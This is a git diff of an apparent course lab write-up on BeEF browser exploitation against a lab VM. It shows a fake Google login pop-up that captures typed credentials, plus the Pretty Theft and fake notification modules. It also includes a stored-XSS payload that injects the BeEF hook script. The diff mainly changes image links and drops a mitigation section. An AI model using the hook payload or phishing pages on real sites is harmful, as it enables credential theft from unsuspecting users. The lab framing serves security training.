@@ -123,20 +123,20 @@ Start the `Terminal` in your Virtual Machine.
   
 
 #### 5. A few BeEF exploits.
-  - First, we'll attempt a social engineering phishing exploit to create a fake Google login pop up. We can use this to capture user credentials.
-  - To access this exploit, select `Google Phishing` under `Social Engineering`.
-       ![wd_hw16](Images/wd_hw16.png)
+  - First to attempt a social engineering phishing exploit to create a fake Google login pop up, we can use this to capture user credentials.
+  - Select `Google Phishing` under `Social Engineering` to access this exploit.
+       ![wd_hw16](Google_phishing.png)
   - After selecting this option, the description of the exploit and any dependencies or options are displayed in the panel on the right.
-       ![wd_hw17](Images/wd_hw17.png)
+       ![wd_hw17](Google_phising_des.png)
   - To launch the exploit, select Execute in the bottom right corner.
   - After selecting Execute, return back to your browser that was displaying the Butcher Shop website. Note that it has been changed to a Google login page.
   - A victim could easily mistake this for a real login prompt.
   - Lets see what would happen if a victim entered in their credentials. Use the following credentials to login in to the fake Google page. 
     - Username: `hackeruser`  
     - Password: `hackerpass`  
-      ![wd_hw18](Images/wd_hw18.png)  
+      ![wd_hw18](Email_phising.png)  
   - Return to the BeEF control panel. In the center panel, select the first option. Note that now on the right panel, the username and password have been captured by the attacker.  
-      ![wd_hw19](Images/wd_hw19.png)  
+      ![wd_hw19](hacker_email.png)  
 
    - Task details:
      - The page you will test is the Replicants Stored XSS application which was used the first day of this unit: `http://192.168.13.25/vulnerabilities/xss_s/`
@@ -144,22 +144,11 @@ Start the `Terminal` in your Virtual Machine.
      - The payload to inject with this BeEF hook is: `<script src="http://127.0.0.1:3000/hook.js"></script>`
 
   - Social Engineering >> Pretty Theft
-    ![Pretty Theft Facebook](/Images/Social-Engineering-Pretty-Theft-1.PNG)  
-    ![Pretty Theft LinkedIn](/Images/Social-Engineering-Pretty-Theft-2.PNG)  
-    ![Pretty Theft Microsoft Windows](/Images/Social-Engineering-Pretty-Theft-3.PNG)  
+    ![Pretty Theft Facebook](pretty_theft.PNG)  
+    ![Pretty Theft Facebook](facebook_timeout.PNG)  
+    ![Pretty Theft LinkedIn](youtube_timeout.PNG)  
+   
 
   - Social Engineering >> Fake Notification Bar
-    ![Social Engineering >> Fake Notification Bar](/Images/Social-Engineering-Fake-Notification-Bar.PNG)  
+    ![Social Engineering >> Fake Notification Bar](fake_notification.PNG)  
     
-  - Host >> Get Geolocation (Third Party)
-    ![Host >> Get Geolocation (Third Party)](/Images/Host-Get-Geolocation-Third-Party.PNG)  
-    
-### ***Recommended Mitigation Strategies***  
--------------------------------------------
-> Keep the system up to date
-> Restore the VM to a virgin state on a regular basis (once a week, or once a month). Also change your passwords regularly, assuming that you have been compromised.
-
----
-
-
-© 2021 GitHub, Inc.
